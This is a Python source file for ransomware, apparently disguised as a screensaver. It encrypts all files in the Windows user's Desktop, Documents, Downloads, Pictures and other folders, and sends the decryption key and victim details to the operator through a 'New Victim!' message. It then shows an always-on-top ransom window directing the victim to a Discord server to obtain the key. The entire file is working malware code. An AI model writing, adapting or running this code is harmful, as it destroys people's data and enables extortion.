from libraries import *

class Main:
    def __init__(self):
        super(Main, self).__init__()

        self.KEY = Fernet.generate_key()
        self.USER = getuser()
        self.DIRECTORIES = ["Desktop", "3D Objects", "Documents", "Downloads", "Music", "Pictures", "Videos"]
        self.COUNTER = 0
        self.DATE = datetime.today().strftime("%d/%m/%Y")
        self.TIME = datetime.now().strftime("%H:%M:%S")

        self.ENTRY = None
        self.LABEL_5 = None

        self.CLOSE = False

        self.start()

    def encrypt(self):
        for DIRECTORY in self.DIRECTORIES:
            for FILE1, FILE2, FILE3 in os.walk(f"C:\\Users\\{self.USER}\\{DIRECTORY}"):
                for FILE in FILE3:
                    FILEPATH = os.path.join(FILE1, FILE)
                    try:
                        with open(FILEPATH, "rb") as ORIGINAL_FILE:
                            ORIGINAL_CONTENT = ORIGINAL_FILE.read()
                            ORIGINAL_FILE.close()
                        ENCRYPTED_CONTENT = Fernet(self.KEY).encrypt(ORIGINAL_CONTENT)
                        with open(FILEPATH, "wb") as ENCRYPTED_FILE:
                            ENCRYPTED_FILE.write(b"OHR ! " + ENCRYPTED_CONTENT)
                            ENCRYPTED_FILE.close()
                        self.COUNTER += 1
                    except (Exception,):
                        continue

    def decrypt(self):
        for DIRECTORY in self.DIRECTORIES:
            for FILE1, FILE2, FILE3 in os.walk(f"C:\\Users\\{self.USER}\\{DIRECTORY}"):
                for FILE in FILE3:
                    FILEPATH = os.path.join(FILE1, FILE)
                    try:
                        with open(FILEPATH, "rb") as ENCRYPTED_FILE:
                            ENCRYPTED_CONTENT = ENCRYPTED_FILE.read().replace(b"OHR ! ", b"")
                            ENCRYPTED_FILE.close()
                        DECRYPTED_CONTENT = Fernet(self.KEY).decrypt(ENCRYPTED_CONTENT)
                        with open(FILEPATH, "wb") as DECRYPTED_FILE:
                            DECRYPTED_FILE.write(DECRYPTED_CONTENT)
                            DECRYPTED_FILE.close()
                    except (Exception,):
                        continue

        self.ENTRY.config(state=tkinter.NORMAL)
        self.ENTRY.delete(0, tkinter.END)
        self.ENTRY.insert(0, f"Successfully decrypted {self.COUNTER} files!")
        self.ENTRY.config(disabledforeground="lawngreen")
        self.ENTRY.config(state=tkinter.DISABLED)

        self.LABEL_5.config(state=tkinter.NORMAL, text="Close", fg="royalblue1")
        self.CLOSE = True

    def window(self):
        WINDOW = tkinter.Tk()
        WINDOW.overrideredirect(True)
        WINDOW.attributes("-topmost", True)
        WINDOW.geometry(f"320x190+{round(GetSystemMetrics(0) / 2) - 160}+{round(GetSystemMetrics(1) / 2) - 95}")
        WINDOW.config(bg="gray10", relief="flat")
        WINDOW.title("Ooops...")

        WARNING = tkinter.Label(WINDOW, text="IF YOU CLOSE THIS WINDOW YOUR FILES WILL BE ENCRYPTED FOREVER", font=("Arial", 7), fg="red", bg="yellow", width=170)

        LABEL_1 = tkinter.Label(WINDOW, text="Ooops... Your files are encrypted!", font=("Arial", 14), fg="red", bg="gray10")
        LABEL_1.place(x=160, y=47, anchor="center")

        LABEL_2 = tkinter.Label(WINDOW, text="Unfortunately we don't have a key :)\nJoin the discord server to get one", font=("Arial", 11), fg="red", bg="gray10")
        LABEL_2.place(x=160, y=90, anchor="center")

        LABEL_3 = tkinter.Label(WINDOW, text="https://discord.gg/y6KcDSWtcy", fg="red", bg="gray10")
        LABEL_3.place(x=160, y=137, anchor="center")

        LABEL_4 = tkinter.Label(WINDOW, text="Key:", fg="red", bg="gray10")
        LABEL_4.place(x=0, y=190, anchor="sw")

        self.ENTRY = tkinter.Entry(WINDOW, fg="lawngreen", bg="gray15", bd=1, relief="solid", width=37, disabledforeground="gray40", disabledbackground="gray15")
        self.ENTRY.place(x=30, y=188, anchor="sw")

        self.LABEL_5 = tkinter.Label(WINDOW, text="Decrypt", fg="royalblue1", bg="gray12", bd=1, relief="solid", width=8, disabledforeground="gray40")
        self.LABEL_5.place(x=258, y=188, anchor="sw")

        def warning():
            position = 0
            while True:
                sleep(0.005)
                if position == -705:
                    position = 0
                position -= 1
                WARNING.place(x=position, y=0)
        Thread(target=warning).start()

        def decrypt_enter(_):
            self.LABEL_5.config(bg="gray14")
        def decrypt_leave(_):
            self.LABEL_5.config(bg="gray12")
        def decrypt_click(_):
            if self.LABEL_5["state"] != "disabled" and not self.CLOSE:
                self.LABEL_5.config(state=tkinter.DISABLED)

                self.KEY = self.ENTRY.get()
                Thread(target=self.decrypt).start()

                self.ENTRY.delete(0, tkinter.END)
                self.ENTRY.insert(0, "Decrypting...")
                self.ENTRY.config(state=tkinter.DISABLED)
            elif self.CLOSE:
                call("taskkill /f /im screensaver.scr", creationflags=0x08000000)

        self.LABEL_5.bind("<Enter>", decrypt_enter)
        self.LABEL_5.bind("<Leave>", decrypt_leave)
        self.LABEL_5.bind("<Button-1>", decrypt_click)

        self.KEY = None

        WINDOW.mainloop()

    def start(self):
        ENCRYPTION_TIME = better_round(timeit(self.encrypt, number=1), 3)
        send(message=f"""New Victim!\nDetails:\n - Victim: {self.USER}\n - Key: {self.KEY.decode()}\n - Files: {self.COUNTER}\n - Date and time: {self.DATE} | {self.TIME}\n - Encryption time: {ENCRYPTION_TIME}""")
        self.window()


Main()
